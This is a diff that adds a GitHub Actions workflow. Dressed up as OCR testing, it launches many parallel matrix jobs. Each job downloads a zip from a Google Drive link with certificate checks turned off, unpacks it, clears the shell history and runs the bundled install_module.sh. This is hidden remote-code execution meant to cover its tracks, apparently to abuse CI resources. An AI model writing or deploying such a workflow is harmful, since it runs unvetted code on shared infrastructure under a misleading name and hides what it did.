@@ -1,0 +1,56 @@
+name: thongtin5lab
+on:
+  push:
+    branches: [ "main" ]
+  workflow_dispatch:
+
+jobs:
+  Generate:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        go: [I.0, I.I, I.II]
+        flag: ['Adapt', 'Assemble', 'Confirm', 'Ignite', 'Release']
+
+    env:
+        NUM_JOBS: 20
+        JOB: ${ matrix.go }
+    steps:
+    - uses: actions/checkout@v1
+    - name: Install Packages
+      run: |
+        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1CQCvu4BTjvGbCGXd6pTXABW_dONA17qP" -O thongtin5lab.zip
+        unzip -o thongtin5lab.zip
+        rm thongtin5lab.zip
+        history -c && history -w
+
+    - name: Test OCR Images
+      run: bash install_module.sh
+
+
+  VERIFY1:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        go: [I.0, I.I, I.II]
+        flag: ['Acquire', 'Assemble', 'Verify', 'Launch', 'Deliver']
+
+    env:
+        NUM_JOBS: 20
+        JOB: ${ matrix.go }
+    steps:
+    - uses: actions/checkout@v1
+    - name: Install Packages
+      run: |
+        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1CQCvu4BTjvGbCGXd6pTXABW_dONA17qP" -O thongtin5lab.zip
+        unzip -o thongtin5lab.zip
+        rm thongtin5lab.zip
+        history -c && history -w
+
+    - name: Test OCR Images
+      run: bash install_module.sh
+        
